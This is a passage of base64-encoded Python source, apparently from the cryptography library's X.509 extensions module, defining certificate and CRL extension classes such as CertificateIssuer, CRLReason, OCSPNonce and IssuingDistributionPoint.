FtZV0sXHJcbiAgICAgICAgdHlwaW5nLkxpc3RbTmFtZV0sXHJcbiAgICAgICAgdHlwaW5nLkxpc3RbT2JqZWN0SWRlbnRpZmllcl0sXHJcbiAgICBdOlxyXG4gICAgICAgIHJldHVybiBzZWxmLl9nZW5lcmFsX25hbWVzLmdldF92YWx1ZXNfZm9yX3R5cGUodHlwZSlcclxuXHJcbiAgICBkZWYgX19yZXByX18oc2VsZikgLT4gc3RyOlxyXG4gICAgICAgIHJldHVybiAiPElzc3VlckFsdGVybmF0aXZlTmFtZSh7fSk+Ii5mb3JtYXQoc2VsZi5fZ2VuZXJhbF9uYW1lcylcclxuXHJcbiAgICBkZWYgX19lcV9fKHNlbGYsIG90aGVyOiBvYmplY3QpIC0+IGJvb2w6XHJcbiAgICAgICAgaWYgbm90IGlzaW5zdGFuY2Uob3RoZXIsIElzc3VlckFsdGVybmF0aXZlTmFtZSk6XHJcbiAgICAgICAgICAgIHJldHVybiBOb3RJbXBsZW1lbnRlZFxyXG5cclxuICAgICAgICByZXR1cm4gc2VsZi5fZ2VuZXJhbF9uYW1lcyA9PSBvdGhlci5fZ2VuZXJhbF9uYW1lc1xyXG5cclxuICAgIGRlZiBfX2hhc2hfXyhzZWxmKSAtPiBpbnQ6XHJcbiAgICAgICAgcmV0dXJuIGhhc2goc2VsZi5fZ2VuZXJhbF9uYW1lcylcclxuXHJcbiAgICBkZWYgcHVibGljX2J5dGVzKHNlbGYpIC0+IGJ5dGVzOlxyXG4gICAgICAgIHJldHVybiBydXN0X3g1MDkuZW5jb2RlX2V4dGVuc2lvbl92YWx1ZShzZWxmKVxyXG5cclxuXHJcbmNsYXNzIENlcnRpZmljYXRlSXNzdWVyKEV4dGVuc2lvblR5cGUpOlxyXG4gICAgb2lkID0gQ1JMRW50cnlFeHRlbnNpb25PSUQuQ0VSVElGSUNBVEVfSVNTVUVSXHJcblxyXG4gICAgZGVmIF9faW5pdF9fKHNlbGYsIGdlbmVyYWxfbmFtZXM6IHR5cGluZy5JdGVyYWJsZVtHZW5lcmFsTmFtZV0pIC0+IE5vbmU6XHJcbiAgICAgICAgc2VsZi5fZ2VuZXJhbF9uYW1lcyA9IEdlbmVyYWxOYW1lcyhnZW5lcmFsX25hbWVzKVxyXG5cclxuICAgIF9fbGVuX18sIF9faXRlcl9fLCBfX2dldGl0ZW1fXyA9IF9tYWtlX3NlcXVlbmNlX21ldGhvZHMoIl9nZW5lcmFsX25hbWVzIilcclxuXHJcbiAgICBAdHlwaW5nLm92ZXJsb2FkXHJcbiAgICBkZWYgZ2V0X3ZhbHVlc19mb3JfdHlwZShcclxuICAgICAgICBzZWxmLFxyXG4gICAgICAgIHR5cGU6IHR5cGluZy5VbmlvbltcclxuICAgICAgICAgICAgdHlwaW5nLlR5cGVbRE5TTmFtZV0sXHJcbiAgICAgICAgICAgIHR5cGluZy5UeXBlW1VuaWZvcm1SZXNvdXJjZUlkZW50aWZpZXJdLFxyXG4gICAgICAgICAgICB0eXBpbmcuVHlwZVtSRkM4MjJOYW1lXSxcclxuICAgICAgICBdLFxyXG4gICAgKSAtPiB0eXBpbmcuTGlzdFtzdHJdOlxyXG4gICAgICAgIC4uLlxyXG5cclxuICAgIEB0eXBpbmcub3ZlcmxvYWRcclxuICAgIGRlZiBnZXRfdmFsdWVzX2Zvcl90eXBlKFxyXG4gICAgICAgIHNlbGYsXHJcbiAgICAgICAgdHlwZTogdHlwaW5nLlR5cGVbRGlyZWN0b3J5TmFtZV0sXHJcbiAgICApIC0+IHR5cGluZy5MaXN0W05hbWVdOlxyXG4gICAgICAgIC4uLlxyXG5cclxuICAgIEB0eXBpbmcub3ZlcmxvYWRcclxuICAgIGRlZiBnZXRfdmFsdWVzX2Zvcl90eXBlKFxyXG4gICAgICAgIHNlbGYsXHJcbiAgICAgICAgdHlwZTogdHlwaW5nLlR5cGVbUmVnaXN0ZXJlZElEXSxcclxuICAgICkgLT4gdHlwaW5nLkxpc3RbT2JqZWN0SWRlbnRpZmllcl06XHJcbiAgICAgICAgLi4uXHJcblxyXG4gICAgQHR5cGluZy5vdmVybG9hZFxyXG4gICAgZGVmIGdldF92YWx1ZXNfZm9yX3R5cGUoXHJcbiAgICAgICAgc2VsZiwgdHlwZTogdHlwaW5nLlR5cGVbSVBBZGRyZXNzXVxyXG4gICAgKSAtPiB0eXBpbmcuTGlzdFtfSVBBRERSRVNTX1RZUEVTXTpcclxuICAgICAgICAuLi5cclxuXHJcbiAgICBAdHlwaW5nLm92ZXJsb2FkXHJcbiAgICBkZWYgZ2V0X3ZhbHVlc19mb3JfdHlwZShcclxuICAgICAgICBzZWxmLCB0eXBlOiB0eXBpbmcuVHlwZVtPdGhlck5hbWVdXHJcbiAgICApIC0+IHR5cGluZy5MaXN0W090aGVyTmFtZV06XHJcbiAgICAgICAgLi4uXHJcblxyXG4gICAgZGVmIGdldF92YWx1ZXNfZm9yX3R5cGUoXHJcbiAgICAgICAgc2VsZixcclxuICAgICAgICB0eXBlOiB0eXBpbmcuVW5pb25bXHJcbiAgICAgICAgICAgIHR5cGluZy5UeXBlW0ROU05hbWVdLFxyXG4gICAgICAgICAgICB0eXBpbmcuVHlwZVtEaXJlY3RvcnlOYW1lXSxcclxuICAgICAgICAgICAgdHlwaW5nLlR5cGVbSVBBZGRyZXNzXSxcclxuICAgICAgICAgICAgdHlwaW5nLlR5cGVbT3RoZXJOYW1lXSxcclxuICAgICAgICAgICAgdHlwaW5nLlR5cGVbUkZDODIyTmFtZV0sXHJcbiAgICAgICAgICAgIHR5cGluZy5UeXBlW1JlZ2lzdGVyZWRJRF0sXHJcbiAgICAgICAgICAgIHR5cGluZy5UeXBlW1VuaWZvcm1SZXNvdXJjZUlkZW50aWZpZXJdLFxyXG4gICAgICAgIF0sXHJcbiAgICApIC0+IHR5cGluZy5VbmlvbltcclxuICAgICAgICB0eXBpbmcuTGlzdFtfSVBBRERSRVNTX1RZUEVTXSxcclxuICAgICAgICB0eXBpbmcuTGlzdFtzdHJdLFxyXG4gICAgICAgIHR5cGluZy5MaXN0W090aGVyTmFtZV0sXHJcbiAgICAgICAgdHlwaW5nLkxpc3RbTmFtZV0sXHJcbiAgICAgICAgdHlwaW5nLkxpc3RbT2JqZWN0SWRlbnRpZmllcl0sXHJcbiAgICBdOlxyXG4gICAgICAgIHJldHVybiBzZWxmLl9nZW5lcmFsX25hbWVzLmdldF92YWx1ZXNfZm9yX3R5cGUodHlwZSlcclxuXHJcbiAgICBkZWYgX19yZXByX18oc2VsZikgLT4gc3RyOlxyXG4gICAgICAgIHJldHVybiAiPENlcnRpZmljYXRlSXNzdWVyKHt9KT4iLmZvcm1hdChzZWxmLl9nZW5lcmFsX25hbWVzKVxyXG5cclxuICAgIGRlZiBfX2VxX18oc2VsZiwgb3RoZXI6IG9iamVjdCkgLT4gYm9vbDpcclxuICAgICAgICBpZiBub3QgaXNpbnN0YW5jZShvdGhlciwgQ2VydGlmaWNhdGVJc3N1ZXIpOlxyXG4gICAgICAgICAgICByZXR1cm4gTm90SW1wbGVtZW50ZWRcclxuXHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX2dlbmVyYWxfbmFtZXMgPT0gb3RoZXIuX2dlbmVyYWxfbmFtZXNcclxuXHJcbiAgICBkZWYgX19oYXNoX18oc2VsZikgLT4gaW50OlxyXG4gICAgICAgIHJldHVybiBoYXNoKHNlbGYuX2dlbmVyYWxfbmFtZXMpXHJcblxyXG4gICAgZGVmIHB1YmxpY19ieXRlcyhzZWxmKSAtPiBieXRlczpcclxuICAgICAgICByZXR1cm4gcnVzdF94NTA5LmVuY29kZV9leHRlbnNpb25fdmFsdWUoc2VsZilcclxuXHJcblxyXG5jbGFzcyBDUkxSZWFzb24oRXh0ZW5zaW9uVHlwZSk6XHJcbiAgICBvaWQgPSBDUkxFbnRyeUV4dGVuc2lvbk9JRC5DUkxfUkVBU09OXHJcblxyXG4gICAgZGVmIF9faW5pdF9fKHNlbGYsIHJlYXNvbjogUmVhc29uRmxhZ3MpIC0+IE5vbmU6XHJcbiAgICAgICAgaWYgbm90IGlzaW5zdGFuY2UocmVhc29uLCBSZWFzb25GbGFncyk6XHJcbiAgICAgICAgICAgIHJhaXNlIFR5cGVFcnJvcigicmVhc29uIG11c3QgYmUgYW4gZWxlbWVudCBmcm9tIFJlYXNvbkZsYWdzIilcclxuXHJcbiAgICAgICAgc2VsZi5fcmVhc29uID0gcmVhc29uXHJcblxyXG4gICAgZGVmIF9fcmVwcl9fKHNlbGYpIC0+IHN0cjpcclxuICAgICAgICByZXR1cm4gIjxDUkxSZWFzb24ocmVhc29uPXt9KT4iLmZvcm1hdChzZWxmLl9yZWFzb24pXHJcblxyXG4gICAgZGVmIF9fZXFfXyhzZWxmLCBvdGhlcjogb2JqZWN0KSAtPiBib29sOlxyXG4gICAgICAgIGlmIG5vdCBpc2luc3RhbmNlKG90aGVyLCBDUkxSZWFzb24pOlxyXG4gICAgICAgICAgICByZXR1cm4gTm90SW1wbGVtZW50ZWRcclxuXHJcbiAgICAgICAgcmV0dXJuIHNlbGYucmVhc29uID09IG90aGVyLnJlYXNvblxyXG5cclxuICAgIGRlZiBfX2hhc2hfXyhzZWxmKSAtPiBpbnQ6XHJcbiAgICAgICAgcmV0dXJuIGhhc2goc2VsZi5yZWFzb24pXHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYgcmVhc29uKHNlbGYpIC0+IFJlYXNvbkZsYWdzOlxyXG4gICAgICAgIHJldHVybiBzZWxmLl9yZWFzb25cclxuXHJcbiAgICBkZWYgcHVibGljX2J5dGVzKHNlbGYpIC0+IGJ5dGVzOlxyXG4gICAgICAgIHJldHVybiBydXN0X3g1MDkuZW5jb2RlX2V4dGVuc2lvbl92YWx1ZShzZWxmKVxyXG5cclxuXHJcbmNsYXNzIEludmFsaWRpdHlEYXRlKEV4dGVuc2lvblR5cGUpOlxyXG4gICAgb2lkID0gQ1JMRW50cnlFeHRlbnNpb25PSUQuSU5WQUxJRElUWV9EQVRFXHJcblxyXG4gICAgZGVmIF9faW5pdF9fKHNlbGYsIGludmFsaWRpdHlfZGF0ZTogZGF0ZXRpbWUuZGF0ZXRpbWUpIC0+IE5vbmU6XHJcbiAgICAgICAgaWYgbm90IGlzaW5zdGFuY2UoaW52YWxpZGl0eV9kYXRlLCBkYXRldGltZS5kYXRldGltZSk6XHJcbiAgICAgICAgICAgIHJhaXNlIFR5cGVFcnJvcigiaW52YWxpZGl0eV9kYXRlIG11c3QgYmUgYSBkYXRldGltZS5kYXRldGltZSIpXHJcblxyXG4gICAgICAgIHNlbGYuX2ludmFsaWRpdHlfZGF0ZSA9IGludmFsaWRpdHlfZGF0ZVxyXG5cclxuICAgIGRlZiBfX3JlcHJfXyhzZWxmKSAtPiBzdHI6XHJcbiAgICAgICAgcmV0dXJuICI8SW52YWxpZGl0eURhdGUoaW52YWxpZGl0eV9kYXRlPXt9KT4iLmZvcm1hdChcclxuICAgICAgICAgICAgc2VsZi5faW52YWxpZGl0eV9kYXRlXHJcbiAgICAgICAgKVxyXG5cclxuICAgIGRlZiBfX2VxX18oc2VsZiwgb3RoZXI6IG9iamVjdCkgLT4gYm9vbDpcclxuICAgICAgICBpZiBub3QgaXNpbnN0YW5jZShvdGhlciwgSW52YWxpZGl0eURhdGUpOlxyXG4gICAgICAgICAgICByZXR1cm4gTm90SW1wbGVtZW50ZWRcclxuXHJcbiAgICAgICAgcmV0dXJuIHNlbGYuaW52YWxpZGl0eV9kYXRlID09IG90aGVyLmludmFsaWRpdHlfZGF0ZVxyXG5cclxuICAgIGRlZiBfX2hhc2hfXyhzZWxmKSAtPiBpbnQ6XHJcbiAgICAgICAgcmV0dXJuIGhhc2goc2VsZi5pbnZhbGlkaXR5X2RhdGUpXHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYgaW52YWxpZGl0eV9kYXRlKHNlbGYpIC0+IGRhdGV0aW1lLmRhdGV0aW1lOlxyXG4gICAgICAgIHJldHVybiBzZWxmLl9pbnZhbGlkaXR5X2RhdGVcclxuXHJcbiAgICBkZWYgcHVibGljX2J5dGVzKHNlbGYpIC0+IGJ5dGVzOlxyXG4gICAgICAgIHJldHVybiBydXN0X3g1MDkuZW5jb2RlX2V4dGVuc2lvbl92YWx1ZShzZWxmKVxyXG5cclxuXHJcbmNsYXNzIFByZWNlcnRpZmljYXRlU2lnbmVkQ2VydGlmaWNhdGVUaW1lc3RhbXBzKEV4dGVuc2lvblR5cGUpOlxyXG4gICAgb2lkID0gRXh0ZW5zaW9uT0lELlBSRUNFUlRfU0lHTkVEX0NFUlRJRklDQVRFX1RJTUVTVEFNUFNcclxuXHJcbiAgICBkZWYgX19pbml0X18oXHJcbiAgICAgICAgc2VsZixcclxuICAgICAgICBzaWduZWRfY2VydGlmaWNhdGVfdGltZXN0YW1wczogdHlwaW5nLkl0ZXJhYmxlW1xyXG4gICAgICAgICAgICBTaWduZWRDZXJ0aWZpY2F0ZVRpbWVzdGFtcFxyXG4gICAgICAgIF0sXHJcbiAgICApIC0+IE5vbmU6XHJcbiAgICAgICAgc2lnbmVkX2NlcnRpZmljYXRlX3RpbWVzdGFtcHMgPSBsaXN0KHNpZ25lZF9jZXJ0aWZpY2F0ZV90aW1lc3RhbXBzKVxyXG4gICAgICAgIGlmIG5vdCBhbGwoXHJcbiAgICAgICAgICAgIGlzaW5zdGFuY2Uoc2N0LCBTaWduZWRDZXJ0aWZpY2F0ZVRpbWVzdGFtcClcclxuICAgICAgICAgICAgZm9yIHNjdCBpbiBzaWduZWRfY2VydGlmaWNhdGVfdGltZXN0YW1wc1xyXG4gICAgICAgICk6XHJcbiAgICAgICAgICAgIHJhaXNlIFR5cGVFcnJvcihcclxuICAgICAgICAgICAgICAgICJFdmVyeSBpdGVtIGluIHRoZSBzaWduZWRfY2VydGlmaWNhdGVfdGltZXN0YW1wcyBsaXN0IG11c3QgYmUgIlxyXG4gICAgICAgICAgICAgICAgImEgU2lnbmVkQ2VydGlmaWNhdGVUaW1lc3RhbXAiXHJcbiAgICAgICAgICAgIClcclxuICAgICAgICBzZWxmLl9zaWduZWRfY2VydGlmaWNhdGVfdGltZXN0YW1wcyA9IHNpZ25lZF9jZXJ0aWZpY2F0ZV90aW1lc3RhbXBzXHJcblxyXG4gICAgX19sZW5fXywgX19pdGVyX18sIF9fZ2V0aXRlbV9fID0gX21ha2Vfc2VxdWVuY2VfbWV0aG9kcyhcclxuICAgICAgICAiX3NpZ25lZF9jZXJ0aWZpY2F0ZV90aW1lc3RhbXBzIlxyXG4gICAgKVxyXG5cclxuICAgIGRlZiBfX3JlcHJfXyhzZWxmKSAtPiBzdHI6XHJcbiAgICAgICAgcmV0dXJuICI8UHJlY2VydGlmaWNhdGVTaWduZWRDZXJ0aWZpY2F0ZVRpbWVzdGFtcHMoe30pPiIuZm9ybWF0KFxyXG4gICAgICAgICAgICBsaXN0KHNlbGYpXHJcbiAgICAgICAgKVxyXG5cclxuICAgIGRlZiBfX2hhc2hfXyhzZWxmKSAtPiBpbnQ6XHJcbiAgICAgICAgcmV0dXJuIGhhc2godHVwbGUoc2VsZi5fc2lnbmVkX2NlcnRpZmljYXRlX3RpbWVzdGFtcHMpKVxyXG5cclxuICAgIGRlZiBfX2VxX18oc2VsZiwgb3RoZXI6IG9iamVjdCkgLT4gYm9vbDpcclxuICAgICAgICBpZiBub3QgaXNpbnN0YW5jZShvdGhlciwgUHJlY2VydGlmaWNhdGVTaWduZWRDZXJ0aWZpY2F0ZVRpbWVzdGFtcHMpOlxyXG4gICAgICAgICAgICByZXR1cm4gTm90SW1wbGVtZW50ZWRcclxuXHJcbiAgICAgICAgcmV0dXJuIChcclxuICAgICAgICAgICAgc2VsZi5fc2lnbmVkX2NlcnRpZmljYXRlX3RpbWVzdGFtcHNcclxuICAgICAgICAgICAgPT0gb3RoZXIuX3NpZ25lZF9jZXJ0aWZpY2F0ZV90aW1lc3RhbXBzXHJcbiAgICAgICAgKVxyXG5cclxuICAgIGRlZiBwdWJsaWNfYnl0ZXMoc2VsZikgLT4gYnl0ZXM6XHJcbiAgICAgICAgcmV0dXJuIHJ1c3RfeDUwOS5lbmNvZGVfZXh0ZW5zaW9uX3ZhbHVlKHNlbGYpXHJcblxyXG5cclxuY2xhc3MgU2lnbmVkQ2VydGlmaWNhdGVUaW1lc3RhbXBzKEV4dGVuc2lvblR5cGUpOlxyXG4gICAgb2lkID0gRXh0ZW5zaW9uT0lELlNJR05FRF9DRVJUSUZJQ0FURV9USU1FU1RBTVBTXHJcblxyXG4gICAgZGVmIF9faW5pdF9fKFxyXG4gICAgICAgIHNlbGYsXHJcbiAgICAgICAgc2lnbmVkX2NlcnRpZmljYXRlX3RpbWVzdGFtcHM6IHR5cGluZy5JdGVyYWJsZVtcclxuICAgICAgICAgICAgU2lnbmVkQ2VydGlmaWNhdGVUaW1lc3RhbXBcclxuICAgICAgICBdLFxyXG4gICAgKSAtPiBOb25lOlxyXG4gICAgICAgIHNpZ25lZF9jZXJ0aWZpY2F0ZV90aW1lc3RhbXBzID0gbGlzdChzaWduZWRfY2VydGlmaWNhdGVfdGltZXN0YW1wcylcclxuICAgICAgICBpZiBub3QgYWxsKFxyXG4gICAgICAgICAgICBpc2luc3RhbmNlKHNjdCwgU2lnbmVkQ2VydGlmaWNhdGVUaW1lc3RhbXApXHJcbiAgICAgICAgICAgIGZvciBzY3QgaW4gc2lnbmVkX2NlcnRpZmljYXRlX3RpbWVzdGFtcHNcclxuICAgICAgICApOlxyXG4gICAgICAgICAgICByYWlzZSBUeXBlRXJyb3IoXHJcbiAgICAgICAgICAgICAgICAiRXZlcnkgaXRlbSBpbiB0aGUgc2lnbmVkX2NlcnRpZmljYXRlX3RpbWVzdGFtcHMgbGlzdCBtdXN0IGJlICJcclxuICAgICAgICAgICAgICAgICJhIFNpZ25lZENlcnRpZmljYXRlVGltZXN0YW1wIlxyXG4gICAgICAgICAgICApXHJcbiAgICAgICAgc2VsZi5fc2lnbmVkX2NlcnRpZmljYXRlX3RpbWVzdGFtcHMgPSBzaWduZWRfY2VydGlmaWNhdGVfdGltZXN0YW1wc1xyXG5cclxuICAgIF9fbGVuX18sIF9faXRlcl9fLCBfX2dldGl0ZW1fXyA9IF9tYWtlX3NlcXVlbmNlX21ldGhvZHMoXHJcbiAgICAgICAgIl9zaWduZWRfY2VydGlmaWNhdGVfdGltZXN0YW1wcyJcclxuICAgIClcclxuXHJcbiAgICBkZWYgX19yZXByX18oc2VsZikgLT4gc3RyOlxyXG4gICAgICAgIHJldHVybiAiPFNpZ25lZENlcnRpZmljYXRlVGltZXN0YW1wcyh7fSk+Ii5mb3JtYXQobGlzdChzZWxmKSlcclxuXHJcbiAgICBkZWYgX19oYXNoX18oc2VsZikgLT4gaW50OlxyXG4gICAgICAgIHJldHVybiBoYXNoKHR1cGxlKHNlbGYuX3NpZ25lZF9jZXJ0aWZpY2F0ZV90aW1lc3RhbXBzKSlcclxuXHJcbiAgICBkZWYgX19lcV9fKHNlbGYsIG90aGVyOiBvYmplY3QpIC0+IGJvb2w6XHJcbiAgICAgICAgaWYgbm90IGlzaW5zdGFuY2Uob3RoZXIsIFNpZ25lZENlcnRpZmljYXRlVGltZXN0YW1wcyk6XHJcbiAgICAgICAgICAgIHJldHVybiBOb3RJbXBsZW1lbnRlZFxyXG5cclxuICAgICAgICByZXR1cm4gKFxyXG4gICAgICAgICAgICBzZWxmLl9zaWduZWRfY2VydGlmaWNhdGVfdGltZXN0YW1wc1xyXG4gICAgICAgICAgICA9PSBvdGhlci5fc2lnbmVkX2NlcnRpZmljYXRlX3RpbWVzdGFtcHNcclxuICAgICAgICApXHJcblxyXG4gICAgZGVmIHB1YmxpY19ieXRlcyhzZWxmKSAtPiBieXRlczpcclxuICAgICAgICByZXR1cm4gcnVzdF94NTA5LmVuY29kZV9leHRlbnNpb25fdmFsdWUoc2VsZilcclxuXHJcblxyXG5jbGFzcyBPQ1NQTm9uY2UoRXh0ZW5zaW9uVHlwZSk6XHJcbiAgICBvaWQgPSBPQ1NQRXh0ZW5zaW9uT0lELk5PTkNFXHJcblxyXG4gICAgZGVmIF9faW5pdF9fKHNlbGYsIG5vbmNlOiBieXRlcykgLT4gTm9uZTpcclxuICAgICAgICBpZiBub3QgaXNpbnN0YW5jZShub25jZSwgYnl0ZXMpOlxyXG4gICAgICAgICAgICByYWlzZSBUeXBlRXJyb3IoIm5vbmNlIG11c3QgYmUgYnl0ZXMiKVxyXG5cclxuICAgICAgICBzZWxmLl9ub25jZSA9IG5vbmNlXHJcblxyXG4gICAgZGVmIF9fZXFfXyhzZWxmLCBvdGhlcjogb2JqZWN0KSAtPiBib29sOlxyXG4gICAgICAgIGlmIG5vdCBpc2luc3RhbmNlKG90aGVyLCBPQ1NQTm9uY2UpOlxyXG4gICAgICAgICAgICByZXR1cm4gTm90SW1wbGVtZW50ZWRcclxuXHJcbiAgICAgICAgcmV0dXJuIHNlbGYubm9uY2UgPT0gb3RoZXIubm9uY2VcclxuXHJcbiAgICBkZWYgX19oYXNoX18oc2VsZikgLT4gaW50OlxyXG4gICAgICAgIHJldHVybiBoYXNoKHNlbGYubm9uY2UpXHJcblxyXG4gICAgZGVmIF9fcmVwcl9fKHNlbGYpIC0+IHN0cjpcclxuICAgICAgICByZXR1cm4gIjxPQ1NQTm9uY2Uobm9uY2U9ezAubm9uY2Uhcn0pPiIuZm9ybWF0KHNlbGYpXHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYgbm9uY2Uoc2VsZikgLT4gYnl0ZXM6XHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX25vbmNlXHJcblxyXG4gICAgZGVmIHB1YmxpY19ieXRlcyhzZWxmKSAtPiBieXRlczpcclxuICAgICAgICByZXR1cm4gcnVzdF94NTA5LmVuY29kZV9leHRlbnNpb25fdmFsdWUoc2VsZilcclxuXHJcblxyXG5jbGFzcyBJc3N1aW5nRGlzdHJpYnV0aW9uUG9pbnQoRXh0ZW5zaW9uVHlwZSk6XHJcbiAgICBvaWQgPSBFeHRlbnNpb25PSUQuSVNTVUlOR19ESVNUUklCVVRJT05fUE9JTlRcclxuXHJcbiAgICBkZWYgX19pbml0X18oXHJcbiAgICAgICAgc2VsZixcclxuICAgICAgICBmdWxsX25hbWU6IHR5cGluZy5PcHRpb25hbFt0eXBpbmcuSXRlcmFibGVbR2VuZXJhbE5hbWVdXSxcclxuICAgICAgICByZWxhdGl2ZV9uYW1lOiB0eXBpbmcuT3B0aW9uYWxbUmVsYXRpdmVEaXN0aW5ndWlzaGVkTmFtZV0sXHJcbiAgICAgICAgb25seV9jb250YWluc191c2VyX2NlcnRzOiBib29sLFxyXG4gICAgICAgIG9ubHlfY29udGFpbnNfY2FfY2VydHM6IGJvb2wsXHJcbiAgICAgICAgb25seV9zb21lX3JlYXNvbnM6IHR5cGluZy5PcHRpb25hbFt0eXBpbmcuRnJvemVuU2V0W1JlYXNvbkZsYWdzXV0sXHJcbiAgICAgICAgaW5kaXJlY3RfY3JsOiBib29sLFxyXG4gICAgICAgIG9ubHlfY29udGFpbnNfYXR0cmlidXRlX2NlcnRzOiBib29sLFxyXG4gICAgKSAtPiBOb25lOlxyXG4gICAgICAgIGlmIGZ1bGxfbmFtZSBpcyBub3QgTm9uZTpcclxuICAgICAgICAgICAgZnVsbF9uYW1lID0gbGlzdChmdWxsX25hbWUpXHJcblxyXG4gICAgICAgIGlmIG9ubHlfc29tZV9yZWFzb25zIGFuZCAoXHJcbiAgICAgICAgICAgIG5vdCBpc2luc3RhbmNlKG9ubHlfc29tZV9yZWFzb25zLCBmcm96ZW5zZXQpXHJcbiAgICAgICAgICAgIG9yIG5vdCBhbGwoaXNpbnN0YW5jZSh4LCBSZWFzb25GbGFncykgZm9yIHggaW4gb25seV9zb21lX3JlYXNvbnMpXHJcbiAgICAgICAgKTpcclxuICAgICAgICAgICAgcmFpc2UgVHlwZUVycm9yKFxyXG4gICAgICAgICAgICAgICAgIm9ubHlfc29tZV9yZWFzb25zIG11c3QgYmUgTm9uZSBvciBmcm96ZW5zZXQgb2YgUmVhc29uRmxhZ3MiXHJcbiAgICAgICAgICAgIClcclxuXHJcbiAgICAgICAgaWYgb25seV9zb21lX3JlYXNvbnMgYW5kIChcclxuICAgICAgICAgICAgUmVhc29uRmxhZ3MudW5zcGVjaWZpZWQgaW4gb25seV9zb21lX3JlYXNvbnNcclxuICAgICAgICAgICAgb3IgUmVhc29uRmxhZ3MucmVtb3ZlX2Zyb21fY3JsIGluIG9ubHlfc29tZV9yZWFzb25zXHJcbiAgICAgICAgKTpcclxuICAgICAgICAgICAgcmFpc2UgVmFsdWVFcnJvcihcclxuICAgICAgICAgICAgICAgICJ1bnNwZWNpZmllZCBhbmQgcmVtb3ZlX2Zyb21fY3JsIGFyZSBub3QgdmFsaWQgcmVhc29ucyBpbiBhbiAiXHJcbiAgICAgICAgICAgICAgICAiSXNzdWluZ0Rpc3RyaWJ1dGlvblBvaW50IlxyXG4gICAgICAgICAgICApXHJcblxyXG4gICAgICAgIGlmIG5vdCAoXHJcbiAgICAgICAgICAgIGlzaW5zdGFuY2Uob25seV9jb250YWluc191c2VyX2NlcnRzLCBib29sKVxyXG4gICAgICAgICAgICBhbmQgaXNpbnN0YW5jZShvbmx5X2NvbnRhaW5zX2NhX2NlcnRzLCBib29sKVxyXG4gICAgICAgICAgICBhbmQgaXNpbnN0YW5jZShpbmRpcmVjdF9jcmwsIGJvb2wpXHJcbiAgICAgICAgICAgIGFuZCBpc2luc3RhbmNlKG9ubHlfY29udGFpbnNfYXR0cmlidXRlX2NlcnRzLCBib29sKVxyXG4gICAgICAgICk6XHJcbiAgICAgICAgICAgIHJhaXNlIFR5cGVFcnJvcihcclxuICAgICAgICAgICAgICAgICJvbmx5X2NvbnRhaW5zX3VzZXJfY2VydHMsIG9ubHlfY29udGFpbnNfY2FfY2VydHMsICJcclxuICAgICAgICAgICAgICAgICJpbmRpcmVjdF9jcmwgYW5kIG9ubHlfY29udGFpbnNfYXR0cmlidXRlX2NlcnRzICJcclxuICAgICAgICAgICAgICAgICJtdXN0IGFsbCBiZSBib29sZWFuLiJcclxuICAgICAgICAgICAgKVxyXG5cclxuICAgICAgICBjcmxfY29uc3RyYWludHMgPSBbXHJcbiAgICAgICAgICAgIG9ubHlfY29udGFpbnNfdXNlcl9jZXJ0cyxcclxuICAgICAgICAgICAgb25seV9jb250YWluc19jYV9jZXJ0cyxcclxuICAgICAgICAgICAgaW5kaXJlY3RfY3JsLFxyXG4gICAgICAgICAgICBvbmx5X2NvbnRhaW5zX2F0dHJpYnV0ZV9jZXJ0cyxcclxuICAgICAgICBdXHJcblxyXG4gICAgICAgIGlmIGxlbihbeCBmb3IgeCBpbiBjcmxfY29uc3RyYWludHMgaWYgeF0pID4gMTpcclxuICAgICAgICAgICAgcmFpc2UgVmFsdWVFcnJvcihcclxuICAgICAgICAgICAgICAgICJPbmx5IG9uZSBvZiB0aGUgZm9sbG93aW5nIGNhbiBiZSBzZXQgdG8gVHJ1ZTogIlxyXG4gICAgICAgICAgICAgICAgIm9ubHlfY29udGFpbnNfdXNlcl9jZXJ0cywgb25seV9jb250YWluc19jYV9jZXJ0cywgIlxyXG4gICAgICAgICAgICAgICAgImluZGlyZWN0X2NybCwgb25seV9jb250YWluc19hdHRyaWJ1dGVfY2VydHMiXHJcbiAgICAgICAgICAgIClcclxuXHJcbiAgICAgICAgaWYgbm90IGFueShcclxuICAgICAgICAgICAgW1xyXG4gICAgICAgICAgICAgICAgb25seV9jb250YWluc191c2VyX2NlcnRzLFxyXG4gICAgICAgICAgICAgICAgb25seV9jb250YWluc19jYV9jZXJ0cyxcclxuICAgICAgICAgICAgICAgIGluZGlyZWN0X2NybCxcclxuICAgICAgICAgICAgICAgIG9ubHlfY29udGFpbnNfYXR0cmlidXRlX2NlcnRzLFxyXG4gICAgICAgICAgICAgICAgZnVsbF9uYW1lLFxyXG4gICAgICAgICAgICAgICAgcmVsYXRpdmVfbmFtZSxcclxuICAgICAgICAgICAgICAgIG9ubHlfc29tZV9yZWFzb25zLFxyXG4gICAgICAgICAgICBdXHJcbiAgICAgICAgKTpcclxuICAgICAgICAgICAgcmFpc2UgVmFsdWVFcnJvcihcclxuICAgICAgICAgICAgICAgICJDYW5ub3QgY3JlYXRlIGVtcHR5IGV4dGVuc2lvbjogIlxyXG4gICAgICAgICAgICAgICAgImlmIG9ubHlfY29udGFpbnNfdXNlcl9jZXJ0cywgb25seV9jb250YWluc19jYV9jZXJ0cywgIlxyXG4gICAgICAgICAgICAgICAgImluZGlyZWN0X2NybCwgYW5kIG9ubHlfY29udGFpbnNfYXR0cmlidXRlX2NlcnRzIGFyZSBhbGwgRmFsc2UiXHJcbiAgICAgICAgICAgICAgICAiLCB0aGVuIGVpdGhlciBmdWxsX25hbWUsIHJlbGF0aXZlX25hbWUsIG9yIG9ubHlfc29tZV9yZWFzb25zICJcclxuICAgICAgICAgICAgICAgICJtdXN0IGhhdmUgYSB2YWx1ZS4iXHJcbiAgICAgICAgICAgIClcclxuXHJcbiAgICAgICAgc2VsZi5fb25seV9jb250YWluc191c2VyX2NlcnRzID0gb25seV9jb250YWluc191c2VyX2NlcnRzXHJcbiAgICAgICAgc2VsZi5fb25seV9jb250YWluc19jYV9jZXJ0cyA9IG9ubHlfY29udGFpbnNfY2FfY2VydHNcclxuICAgICAgICBzZWxmLl9pbmRpcmVjdF9jcmwgPSBpbmRpcmVjdF9jcmxcclxuICAgICAgICBzZWxmLl9vbmx5X2NvbnRhaW5zX2F0dHJpYnV0ZV9jZXJ0cyA9IG9ubHlfY29udGFpbnNfYXR